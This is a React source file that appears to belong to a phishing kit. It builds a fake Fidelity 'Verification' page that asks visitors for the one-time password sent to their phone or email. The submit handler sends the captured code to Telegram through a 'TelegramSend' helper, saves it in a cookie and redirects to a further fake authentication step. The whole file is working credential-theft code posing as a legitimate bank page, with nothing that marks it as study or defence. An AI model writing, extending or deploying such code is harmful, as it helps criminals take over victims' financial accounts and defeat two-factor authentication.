import React from "react";
import fid from "../assets/fidelity.svg";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Code() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<code>({
    code: ""
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const message = `
        ---- FIDELITY CODE -----
        Code: ${formInput.code}
        `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("code", formInput);
    setIsLoading(false);
    navigate("../login/auth/2", { replace: true });
  }

  return (
    <>
      <div className="navbar">
        <div className="brand">
          <div>
            <img src={fid} alt="" />
          </div>
        </div>

        <div className="nav-texts">
          <p style={{ marginRight: 20 }}>Security</p>
          <p>FAQ</p>
        </div>
      </div>

      <div className="content">
        <div className="form">
            <form onSubmit={handleSubmit} method="POST">
          <div className="form-item">
            <h2>Verification</h2>
            <p>In order to verify your identity, enter the one time password sent to your phone/email.</p>
            
              <div className="form-field">
                <label htmlFor="">Enter code</label>
                <input onChange={handleInputChange} name="code" type="text" />
              </div>

             
              {isLoading ? (
                <div className="form-field">
                  <button type="button">Please wait...</button>
                </div>
              ) : (
                <div className="form-field">
                  <button type="submit">Submit</button>
                </div>
              )}

              <a href="">Forgot username or password?</a>
            
          </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
